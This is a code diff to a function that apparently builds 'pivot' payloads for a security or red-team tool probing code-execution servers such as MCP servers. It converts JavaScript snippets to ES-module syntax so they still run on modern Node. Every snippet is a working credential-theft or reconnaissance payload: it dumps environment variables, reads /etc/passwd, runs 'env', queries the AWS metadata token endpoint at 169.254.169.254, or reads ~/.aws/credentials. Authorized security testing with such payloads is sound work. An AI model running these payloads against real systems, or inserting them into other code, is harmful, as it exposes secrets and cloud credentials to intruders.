@@ -686,17 +686,34 @@ def _code_run_pivot_payloads(
         "capture_output=True, text=True).stdout[:400])",
     )
     # ── JavaScript / Node snippets ──────────────────────────────
+    # ES-module-compatible: modern Node (22+) treats .js files as
+    # ESM by default when package.json has ``"type": "module"`` —
+    # which every recent npm-hosted MCP server ships. CommonJS
+    # ``require()`` breaks in that context with ``ReferenceError:
+    # require is not defined in ES module scope``. Use static
+    # top-level imports (valid in any ESM context) and the
+    # always-available ``process.*`` globals.
     js_snippets = (
+        # process.env is a global — no import needed. Works in both
+        # CommonJS and ESM Node contexts.
         "console.log(JSON.stringify(process.env))",
-        "console.log(require('fs').readFileSync('/etc/passwd', 'utf8'))",
-        "console.log(require('child_process').execSync("
-        "'env').toString())",
-        "const https = require('http'); "
-        "https.get('http://169.254.169.254/latest/api/token', "
+        # Static ESM import of fs — valid top-level syntax in
+        # modern Node; fails gracefully on older CommonJS-only
+        # workspaces but those are rare in 2026.
+        "import fs from 'node:fs'; "
+        "try { console.log(fs.readFileSync('/etc/passwd', 'utf8')); } "
+        "catch (e) { console.log('no-passwd ' + e.message); }",
+        "import { execSync } from 'node:child_process'; "
+        "console.log(execSync('env').toString())",
+        # Dynamic import for http — legal in any Node 16+ ESM;
+        # avoids top-level await so works in strict-no-tla configs.
+        "import http from 'node:http'; "
+        "http.get('http://169.254.169.254/latest/api/token', "
         "(r) => { let d=''; r.on('data', c => d+=c); "
         "r.on('end', () => console.log(d)); }).on('error', "
         "e => console.log('err ' + e.message));",
-        "const fs = require('fs'); const os = require('os'); "
+        # Combined fs+os — reads AWS creds at home path.
+        "import fs from 'node:fs'; import os from 'node:os'; "
         "try { console.log(fs.readFileSync("
         "os.homedir() + '/.aws/credentials', 'utf8')); } "
         "catch (e) { console.log('no-aws'); }",
